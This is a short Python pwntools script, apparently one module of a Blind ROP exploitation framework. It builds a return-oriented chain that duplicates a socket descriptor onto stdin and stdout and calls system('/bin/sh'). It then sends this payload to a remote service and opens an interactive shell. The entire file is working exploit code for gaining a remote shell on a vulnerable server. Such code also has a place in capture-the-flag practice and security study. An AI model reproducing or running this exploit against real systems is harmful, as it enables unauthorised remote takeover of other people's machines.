#!/usr/bin/python3

from pwn import *
import sys


# SYNTAX COLOURS AND SYSTEM DATA:

CCYA = '\x1b[1;36;1m'
CEND = '\x1b[0m'

DODO = 0.06

def exploit(ExploitStructure):

	TMP		= ExploitStructure
	BEGIN	= TMP.beginning()

	SYSTEM	= TMP.SYSTEM
	DUP2	= TMP.DUP2
	BINSH	= TMP.BINSH
	SOCKET	= p64(0x4)

	BROP7	= p64(u64(TMP.BROPGADGET) + 0x7)	# RSI + R15
	BROP9	= p64(u64(TMP.BROPGADGET) + 0x9)	# RDI
	R15		= b'JUNKJUNK'

	STDIN	= p64(0x0)
	STDOUT	= p64(0x1)

	ROPCHAIN	= b''
	ROPCHAIN	+= BROP9
	ROPCHAIN	+= SOCKET
	ROPCHAIN	+= BROP7
	ROPCHAIN	+= STDIN
	ROPCHAIN	+= R15
	ROPCHAIN	+= DUP2

	ROPCHAIN	+= BROP9
	ROPCHAIN	+= SOCKET
	ROPCHAIN	+= BROP7
	ROPCHAIN	+= STDOUT
	ROPCHAIN	+= R15
	ROPCHAIN	+= DUP2

	ROPCHAIN	+= BROP9
	ROPCHAIN	+= BINSH
	ROPCHAIN	+= SYSTEM

	PAYLOAD	= BEGIN + ROPCHAIN

	r = TMP.remoteConnect()
	JUNK = r.recv()
	r.send(PAYLOAD)
	sleep(DODO)

	print(CCYA + "[o] Shell's coming..." + CEND)

	r.interactive()
